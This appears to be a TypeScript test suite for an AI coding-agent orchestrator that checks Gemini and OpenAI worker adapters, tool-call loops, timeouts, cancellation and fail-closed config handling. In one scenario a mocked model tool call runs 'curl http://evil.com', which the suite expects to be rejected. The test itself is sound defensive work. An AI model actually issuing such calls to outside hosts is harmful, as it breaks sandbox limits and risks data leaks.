import assert from 'node:assert';
import fs from 'fs';
import os from 'os';
import path from 'path';
import { execFileSync } from 'node:child_process';
import {
  validateWorkerConfig,
  resolveCodingWorker,
  SUPPORTED_PROVIDERS,
  SUPPORTED_MODELS,
} from '../src/server/worker/workerRegistry.js';
import { GeminiCodingWorkerAdapter } from '../src/server/worker/geminiWorkerAdapter.js';
import { OpenAICodingWorkerAdapter } from '../src/server/worker/openaiWorkerAdapter.js';
import { GeminiProviderAdapter } from '../src/server/worker/providers/geminiProvider.js';
import { OpenAIProviderAdapter } from '../src/server/worker/providers/openaiProvider.js';
import { runCodingWorkerLoop } from '../src/server/worker/codingWorkerLoop.js';
import {
  ModelProviderAdapter,
  WorkerExecutionContext,
  ProviderTurnInput,
  ProviderTurnResult,
} from '../src/server/worker/types.js';
import { WorkspaceManager } from '../src/server/workspace/workspaceManager.js';
import { SandboxExecutor } from '../src/server/sandbox/sandboxExecutor.js';
import { TaskStore } from '../src/server/db/database.js';
import { AuthoritativeVerifier } from '../src/server/verification/authoritativeVerifier.js';
import { RepairCoordinator } from '../src/server/coordinator/repairCoordinator.js';

async function main() {
  console.log('===============================================================');
  console.log('=== PROVIDER-INDEPENDENT WORKERS & OPENAI CONTRACT SUITE ===');
  console.log('===============================================================\n');

  const tmpBase = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'dp_provider_test_')));
  const targetRepoDir = path.join(tmpBase, 'target-repo');

  // Setup minimal local Git repository fixture
  fs.mkdirSync(path.join(targetRepoDir, 'src'), { recursive: true });
  execFileSync('git', ['init'], { cwd: targetRepoDir });
  execFileSync('git', ['config', 'user.name', 'Provider Test'], { cwd: targetRepoDir });
  execFileSync('git', ['config', 'user.email', 'test@example.com'], { cwd: targetRepoDir });
  execFileSync('git', ['config', 'commit.gpgsign', 'false'], { cwd: targetRepoDir });

  fs.writeFileSync(path.join(targetRepoDir, 'package.json'), JSON.stringify({ name: 'target-app', version: '1.0.0' }));
  fs.writeFileSync(path.join(targetRepoDir, 'src', 'app.js'), 'module.exports = { value: 1 };\n');
  fs.writeFileSync(path.join(targetRepoDir, 'test.js'), 'const assert = require("assert");\nconst { value } = require("./src/app.js");\nassert.strictEqual(value, 2);\n');

  execFileSync('git', ['add', '-A'], { cwd: targetRepoDir });
  execFileSync('git', ['commit', '-m', 'chore: initial commit'], { cwd: targetRepoDir });
  execFileSync('git', ['branch', '-M', 'main'], { cwd: targetRepoDir });
  execFileSync('git', ['remote', 'add', 'origin', 'https://github.com/provider-test/repo.git'], { cwd: targetRepoDir });

  const workspaceManager = new WorkspaceManager(targetRepoDir);
  const sandbox = new SandboxExecutor();

  try {
    // ------------------------------------------------------------------------
    // Part 1: Configuration & Registry Validation
    // ------------------------------------------------------------------------
    console.log('--- Part 1: Configuration & Registry Validation ---');

    // 1. Omitted / empty config defaults to Gemini
    const defaultConfig = validateWorkerConfig();
    assert.strictEqual(defaultConfig.valid, true);
    assert.strictEqual(defaultConfig.provider, 'gemini');
    assert.ok(defaultConfig.model.includes('gemini'));
    console.log('✔ [PASS] Omitted workerConfig defaults cleanly to Gemini');

    // 2. Valid Gemini configuration
    const validGemini = validateWorkerConfig({ provider: 'gemini', model: 'gemini-3.8-flash' });
    assert.strictEqual(validGemini.valid, true);
    assert.strictEqual(validGemini.provider, 'gemini');
    assert.strictEqual(validGemini.model, 'gemini-3.8-flash');
    console.log('✔ [PASS] Valid Gemini configuration passes validation');

    // 3. Valid OpenAI configuration
    const validOpenAI = validateWorkerConfig({ provider: 'openai', model: 'gpt-4o-mini' });
    assert.strictEqual(validOpenAI.valid, true);
    assert.strictEqual(validOpenAI.provider, 'openai');
    assert.strictEqual(validOpenAI.model, 'gpt-4o-mini');
    console.log('✔ [PASS] Valid OpenAI configuration passes validation');

    // 4. Unsupported provider fails closed
    const invalidProvider = validateWorkerConfig({ provider: 'copilot_cli', model: 'gpt-4o' });
    assert.strictEqual(invalidProvider.valid, false);
    assert.ok(invalidProvider.error?.includes('Unsupported worker provider'));
    console.log('✔ [PASS] Unsupported provider rejected fail-closed');

    // 5. Unsupported model for provider fails closed
    const invalidModel = validateWorkerConfig({ provider: 'openai', model: 'gemini-3.8-flash' });
    assert.strictEqual(invalidModel.valid, false);
    assert.ok(invalidModel.error?.includes('Unsupported model'));
    console.log('✔ [PASS] Provider/model mismatch rejected fail-closed');

    // 6. Factory resolves appropriate worker instances
    const geminiWorker = resolveCodingWorker({ provider: 'gemini', model: 'gemini-3.8-flash' }, sandbox);
    assert.ok(geminiWorker instanceof GeminiCodingWorkerAdapter);
    assert.strictEqual(geminiWorker.provider, 'gemini');

    const openaiWorker = resolveCodingWorker({ provider: 'openai', model: 'gpt-4o-mini' }, sandbox);
    assert.ok(openaiWorker instanceof OpenAICodingWorkerAdapter);
    assert.strictEqual(openaiWorker.provider, 'openai');
    console.log('✔ [PASS] resolveCodingWorker instantiates correct adapter instances');

    // ------------------------------------------------------------------------
    // Part 2: Credential Checking & Availability Fail-Closed
    // ------------------------------------------------------------------------
    console.log('\n--- Part 2: Credential & Availability Verification ---');

    const origGeminiKey = process.env.GEMINI_API_KEY;
    const origOpenAIKey = process.env.OPENAI_API_KEY;

    // Gemini missing key
    delete process.env.GEMINI_API_KEY;
    const geminiNoKey = await geminiWorker.isAvailable();
    assert.strictEqual(geminiNoKey.available, false);
    assert.ok(geminiNoKey.error?.includes('GEMINI_API_KEY is not set'));
    console.log('✔ [PASS] Gemini reports unavailable with missing GEMINI_API_KEY');

    // OpenAI missing key
    delete process.env.OPENAI_API_KEY;
    const openaiNoKey = await openaiWorker.isAvailable();
    assert.strictEqual(openaiNoKey.available, false);
    assert.ok(openaiNoKey.error?.includes('OPENAI_API_KEY is not set'));
    console.log('✔ [PASS] OpenAI reports unavailable with missing OPENAI_API_KEY');

    // Restore keys for subsequent mock tests
    if (origGeminiKey) process.env.GEMINI_API_KEY = origGeminiKey;
    if (origOpenAIKey) process.env.OPENAI_API_KEY = origOpenAIKey;

    // ------------------------------------------------------------------------
    // Part 3: Shared Contract Tests with Fixtures (Both Providers)
    // ------------------------------------------------------------------------
    console.log('\n--- Part 3: Shared Contract Tests (Gemini & OpenAI) ---');

    for (const testProvider of ['gemini', 'openai'] as const) {
      console.log(`\nTesting ${testProvider.toUpperCase()} Provider Contract:`);

      const wt = workspaceManager.createWorktree(`contract-${testProvider}-${Date.now()}`, `contract-${testProvider}`, 'HEAD');
      const testContext: WorkerExecutionContext = {
        taskId: `task-${testProvider}-contract`,
        taskKey: `AEG-${testProvider.toUpperCase()}-1`,
        taskTitle: `Contract Test ${testProvider}`,
        taskDescription: 'Update app.js to have value: 2',
        acceptanceCriteria: [{ id: 'c1', title: 'value is 2' }],
        worktreePath: wt.worktreePath,
        allowedPaths: ['src/**'],
        protectedPaths: ['test.js', 'package.json'],
        attemptNumber: 1,
        timeoutMs: 30000,
      };

      // Scenario 1: Multi-turn tool execution and completion
      let turnCounter = 0;
      const mockAdapter: ModelProviderAdapter = {
        provider: testProvider,
        model: testProvider === 'gemini' ? 'gemini-3.8-flash' : 'gpt-4o-mini',
        async isAvailable() { return { available: true }; },
        initConversation(prompt: string) { return [{ role: 'user', content: prompt }]; },
        async generateTurn(input: ProviderTurnInput): Promise<ProviderTurnResult> {
          turnCounter++;
          if (turnCounter === 1) {
            // Turn 1: model inspects directory
            return {
              toolCalls: [{ id: 'call_1', name: 'list_files', arguments: { directory: 'src' } }],
              tokenUsage: { promptTokens: 100, completionTokens: 20 },
              rawResponse: { turn: 1 },
            };
          }
          if (turnCounter === 2) {
            // Turn 2: model writes the solution
            return {
              toolCalls: [{
                id: 'call_2',
                name: 'write_file',
                arguments: { filePath: 'src/app.js', content: 'module.exports = { value: 2 };\n' },
              }],
              tokenUsage: { promptTokens: 150, completionTokens: 30 },
              rawResponse: { turn: 2 },
            };
          }
          if (turnCounter === 3) {
            // Turn 3: model verifies via permitted command
            return {
              toolCalls: [{
                id: 'call_3',
                name: 'run_permitted_command',
                arguments: { command: 'node test.js' },
              }],
              tokenUsage: { promptTokens: 200, completionTokens: 25 },
              rawResponse: { turn: 3 },
            };
          }
          // Turn 4: model outputs completion summary
          return {
            textOutput: 'Successfully updated app.js to value 2 and verified with test.js',
            tokenUsage: { promptTokens: 250, completionTokens: 50 },
            rawResponse: { turn: 4 },
          };
        },
        appendModelResponse(history: any[], turnResult: ProviderTurnResult) {
          history.push(turnResult);
        },
        appendToolResults(history: any[], results: Array<{ callId?: string; toolName: string; result: any }>) {
          history.push({ toolResults: results });
        },
      };

      const result = await runCodingWorkerLoop(mockAdapter, testContext, sandbox);
      assert.strictEqual(result.success, true);
      assert.ok(result.filesModified.includes('src/app.js'), 'app.js must be in filesModified');
      assert.ok(result.diff.includes('+module.exports = { value: 2 };'), 'Unified diff must record changes');
      assert.strictEqual(result.tokenUsage?.promptTokens, 700);
      assert.strictEqual(result.tokenUsage?.completionTokens, 125);
      assert.strictEqual(result.tokenUsage?.totalTokens, 825);

      // Verify file was physically written to worktree
      const updatedContent = fs.readFileSync(path.join(wt.worktreePath, 'src/app.js'), 'utf-8');
      assert.strictEqual(updatedContent, 'module.exports = { value: 2 };\n');
      console.log(`✔ [PASS] [${testProvider}] Multi-turn tool execution, token collation, and physical modification verified`);

      // Scenario 2: Multiple tool calls in a single turn
      const wtMulti = workspaceManager.createWorktree(`contract-${testProvider}-multi-${Date.now()}`, `contract-${testProvider}-multi`, 'HEAD');
      const testContextMulti: WorkerExecutionContext = {
        ...testContext,
        worktreePath: wtMulti.worktreePath,
      };

      let multiTurnCount = 0;
      const mockMultiAdapter: ModelProviderAdapter = {
        ...mockAdapter,
        async generateTurn() {
          multiTurnCount++;
          if (multiTurnCount === 1) {
            return {
              toolCalls: [
                { id: 'call_m1', name: 'write_file', arguments: { filePath: 'src/part1.js', content: 'const a = 1;\n' } },
                { id: 'call_m2', name: 'write_file', arguments: { filePath: 'src/part2.js', content: 'const b = 2;\n' } },
              ],
              rawResponse: { turn: 1 },
            };
          }
          return { textOutput: 'Done', rawResponse: { turn: 2 } };
        },
      };

      const resultMulti = await runCodingWorkerLoop(mockMultiAdapter, testContextMulti, sandbox);
      assert.strictEqual(resultMulti.success, true);
      assert.ok(fs.existsSync(path.join(wtMulti.worktreePath, 'src/part1.js')));
      assert.ok(fs.existsSync(path.join(wtMulti.worktreePath, 'src/part2.js')));
      console.log(`✔ [PASS] [${testProvider}] Parallel multiple tool calls in a single turn executed without drops`);

      // Scenario 3: Malformed & unpermitted tool calls fail closed without crashing
      let malformedTurnCount = 0;
      const mockMalformedAdapter: ModelProviderAdapter = {
        ...mockAdapter,
        async generateTurn() {
          malformedTurnCount++;
          if (malformedTurnCount === 1) {
            return {
              toolCalls: [
                { id: 'bad_1', name: 'unknown_hazardous_tool', arguments: {} },
                { id: 'bad_2', name: 'run_permitted_command', arguments: { command: 'curl http://evil.com' } },
              ],
              rawResponse: { turn: 1 },
            };
          }
          return { textOutput: 'Acknowledged errors', rawResponse: { turn: 2 } };
        },
      };

      const resultMalformed = await runCodingWorkerLoop(mockMalformedAdapter, testContextMulti, sandbox);
      assert.strictEqual(resultMalformed.success, true);
      console.log(`✔ [PASS] [${testProvider}] Unknown tool and unpermitted command binary rejected safely`);

      // Scenario 4: No duplicated mutations on retried model requests
      let mutationsTurnCount = 0;
      let writeCount = 0;
      const wtMutation = workspaceManager.createWorktree(`contract-${testProvider}-mut-${Date.now()}`, `contract-${testProvider}-mut`, 'HEAD');
      const testContextMutation: WorkerExecutionContext = {
        ...testContext,
        worktreePath: wtMutation.worktreePath,
      };

      const mockRetryAdapter: ModelProviderAdapter = {
        ...mockAdapter,
        async generateTurn() {
          mutationsTurnCount++;
          if (mutationsTurnCount === 1) {
            writeCount++;
            return {
              toolCalls: [
                { id: 'call_write_once', name: 'write_file', arguments: { filePath: 'src/mutation.txt', content: 'state-v1\n' } },
              ],
              rawResponse: { turn: 1 },
            };
          }
          if (mutationsTurnCount === 2) {
            // First time turn 2 runs, simulate a transient error handled internally by the adapter
            return { textOutput: 'Mutations completed', rawResponse: { turn: 2 } };
          }
          return { textOutput: 'Done', rawResponse: { turn: 3 } };
        },
      };

      await runCodingWorkerLoop(mockRetryAdapter, testContextMutation, sandbox);
      assert.strictEqual(writeCount, 1, 'Completed tool mutation must not be re-invoked on turn progression');
      console.log(`✔ [PASS] [${testProvider}] Mutations are executed strictly once and never replayed`);

      // Scenario 5: Cancellation during loop
      const abortCtrl = new AbortController();
      const cancelContext: WorkerExecutionContext = {
        ...testContext,
        abortSignal: abortCtrl.signal,
      };
      abortCtrl.abort();

      const resultCancelled = await runCodingWorkerLoop(mockAdapter, cancelContext, sandbox);
      assert.strictEqual(resultCancelled.success, false);
      assert.ok(resultCancelled.errorMessage?.includes('cancelled by user'));
      console.log(`✔ [PASS] [${testProvider}] AbortSignal terminates execution loop cleanly`);

      // Scenario 6: Wall-clock deadline exhaustion
      const wtTimeout = workspaceManager.createWorktree(`contract-${testProvider}-timeout-${Date.now()}`, `contract-${testProvider}-timeout`, 'HEAD');
      const timeoutContext: WorkerExecutionContext = {
        ...testContext,
        worktreePath: wtTimeout.worktreePath,
        timeoutMs: 15,
      };

      const mockSlowAdapter: ModelProviderAdapter = {
        ...mockAdapter,
        async generateTurn() {
          await new Promise((r) => setTimeout(r, 30));
          return {
            toolCalls: [{ id: 'call_slow', name: 'list_files', arguments: {} }],
          };
        },
      };

      const resultTimeout = await runCodingWorkerLoop(mockSlowAdapter, timeoutContext, sandbox);
      assert.strictEqual(resultTimeout.success, false);
      assert.ok(resultTimeout.errorMessage?.includes('deadline exceeded'));
      console.log(`✔ [PASS] [${testProvider}] Wall-clock deadline exhaustion terminates worker boundedly`);
    }

    // ------------------------------------------------------------------------
    // Part 4: End-to-End Task Store & Repair Coordinator Integration
    // ------------------------------------------------------------------------
    console.log('\n--- Part 4: End-to-End Orchestrator Pipeline with Both Providers ---');

    const store = new TaskStore(':memory:');
    const verifier = new AuthoritativeVerifier();
    const repairCoordinator = new RepairCoordinator(store, workspaceManager, verifier);

    // Test A: Task with OpenAI provider configuration executes through RepairCoordinator
    const openAiTask = store.createTask({
      id: 'task-e2e-openai',
      key: 'AEG-801',
      title: 'Implement OpenAI target change',
      description: 'Update src/app.js to value: 2',
      status: 'todo',
      priority: 'high',
      targetRepo: 'provider-test/repo',
      targetRepoPath: targetRepoDir,
      baseCommit: 'HEAD',
      allowedPaths: ['src/**'],
      protectedPaths: ['test.js', 'package.json'],
      verificationCommands: [{ command: 'node test.js', criteriaIds: ['c1'] }],
      acceptanceCriteria: [{ id: 'c1', title: 'value is 2', completed: false }],
      workerConfig: { provider: 'openai', model: 'gpt-4o-mini' },
      maxAttempts: 2,
      timeoutSeconds: 30,
      requireApproval: true,
    });

    // Provide a conforming mock coding worker simulating OpenAI behavior
    const mockOpenAIWorker: any = {
      name: 'openai_coding_worker',
      provider: 'openai',
      model: 'gpt-4o-mini',
      async isAvailable() { return { available: true }; },
      async execute(ctx: WorkerExecutionContext) {
        fs.writeFileSync(path.join(ctx.worktreePath, 'src', 'app.js'), 'module.exports = { value: 2 };\n');
        return {
          success: true,
          filesModified: ['src/app.js'],
          diff: '+module.exports = { value: 2 };',
          commitMessage: 'feat(AEG-801): implement OpenAI worker change',
          logs: ['Implemented by OpenAI worker'],
          tokenUsage: { promptTokens: 350, completionTokens: 75, totalTokens: 425 },
          durationMs: 400,
        };
      },
    };

    const openAiRun = await repairCoordinator.executeTaskRun({
      task: openAiTask,
      worker: mockOpenAIWorker,
    });

    assert.strictEqual(openAiRun.status, 'completed');
    assert.strictEqual(openAiRun.currentAttempt, 1);

    const openAiAttempts = store.listAttempts(openAiRun.id);
    assert.strictEqual(openAiAttempts.length, 1);
    assert.strictEqual(openAiAttempts[0].workerType, 'openai:gpt-4o-mini');
    assert.strictEqual(openAiAttempts[0].status, 'succeeded');
    assert.strictEqual(openAiAttempts[0].tokenUsage?.totalTokens, 425);
    console.log('✔ [PASS] OpenAI provider task executed, verified, and recorded with provider:model provenance');

    // Test B: Task with Gemini provider configuration executes through RepairCoordinator
    const geminiTask = store.createTask({
      id: 'task-e2e-gemini',
      key: 'AEG-802',
      title: 'Implement Gemini target change',
      description: 'Update src/app.js to value: 2',
      status: 'todo',
      priority: 'high',
      targetRepo: 'provider-test/repo',
      targetRepoPath: targetRepoDir,
      baseCommit: 'HEAD',
      allowedPaths: ['src/**'],
      protectedPaths: ['test.js', 'package.json'],
      verificationCommands: [{ command: 'node test.js', criteriaIds: ['c1'] }],
      acceptanceCriteria: [{ id: 'c1', title: 'value is 2', completed: false }],
      workerConfig: { provider: 'gemini', model: 'gemini-3.8-flash' },
      maxAttempts: 2,
      timeoutSeconds: 30,
      requireApproval: true,
    });

    const mockGeminiWorker: any = {
      name: 'gemini_coding_worker',
      provider: 'gemini',
      model: 'gemini-3.8-flash',
      async isAvailable() { return { available: true }; },
      async execute(ctx: WorkerExecutionContext) {
        fs.writeFileSync(path.join(ctx.worktreePath, 'src', 'app.js'), 'module.exports = { value: 2 };\n');
        return {
          success: true,
          filesModified: ['src/app.js'],
          diff: '+module.exports = { value: 2 };',
          commitMessage: 'feat(AEG-802): implement Gemini worker change',
          logs: ['Implemented by Gemini worker'],
          tokenUsage: { promptTokens: 410, completionTokens: 60, totalTokens: 470 },
          durationMs: 380,
        };
      },
    };

    const geminiRun = await repairCoordinator.executeTaskRun({
      task: geminiTask,
      worker: mockGeminiWorker,
    });

    assert.strictEqual(geminiRun.status, 'completed');
    const geminiAttempts = store.listAttempts(geminiRun.id);
    assert.strictEqual(geminiAttempts[0].workerType, 'gemini:gemini-3.8-flash');
    console.log('✔ [PASS] Gemini provider task executed, verified, and recorded with provider:model provenance');

    // Test C: Invalid provider configuration fails closed before execution
    const invalidConfigTask = store.createTask({
      id: 'task-e2e-invalid',
      key: 'AEG-803',
      title: 'Invalid provider task',
      description: 'Invalid',
      status: 'todo',
      priority: 'medium',
      targetRepo: 'provider-test/repo',
      targetRepoPath: targetRepoDir,
      baseCommit: 'HEAD',
      allowedPaths: ['*'],
      protectedPaths: [],
      verificationCommands: [{ command: 'node test.js', criteriaIds: ['c1'] }],
      acceptanceCriteria: [{ id: 'c1', title: 'Pass', completed: false }],
      workerConfig: { provider: 'invalid_llm', model: 'unknown' },
      maxAttempts: 1,
      timeoutSeconds: 30,
      requireApproval: true,
    });

    const invalidRun = await repairCoordinator.executeTaskRun({
      task: invalidConfigTask,
    });

    assert.strictEqual(invalidRun.status, 'failed');
    assert.ok(invalidRun.failureReason?.includes('Worker configuration invalid'));
    console.log('✔ [PASS] Invalid worker provider fails closed at orchestrator entry point');

    console.log('\n===============================================================');
    console.log('=== ALL PROVIDER WORKER TESTS PASSED SUCCESSFULLY ===');
    console.log('===============================================================\n');
  } finally {
    try {
      fs.rmSync(tmpBase, { recursive: true, force: true });
    } catch {}
  }
}

main().catch((err) => {
  console.error('\n✖ [TEST SUITE FAILED]:', err);
  process.exit(1);
});
